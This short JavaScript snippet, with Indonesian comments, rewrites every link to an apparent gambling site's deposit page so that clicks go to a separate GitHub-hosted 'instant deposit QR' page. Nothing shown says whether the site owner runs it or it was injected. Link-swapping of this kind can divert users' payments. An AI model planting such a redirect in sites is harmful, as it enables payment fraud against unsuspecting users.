document.addEventListener("DOMContentLoaded", function () {
  // Seleksi semua elemen <a>
  document.querySelectorAll('a[href="http://fantasy69-mantap.shop/deposit"]').forEach(function (el) {
    // Ganti href
    el.setAttribute("href", "https://inggarfi.github.io/instantdepositqr/fanta.html");

    // Jika klik, langsung redirect juga (opsional)
    el.addEventListener("click", function (e) {
      e.preventDefault();
      window.location.href = "https://inggarfi.github.io/instantdepositqr/fanta.html";
    });
  });
});
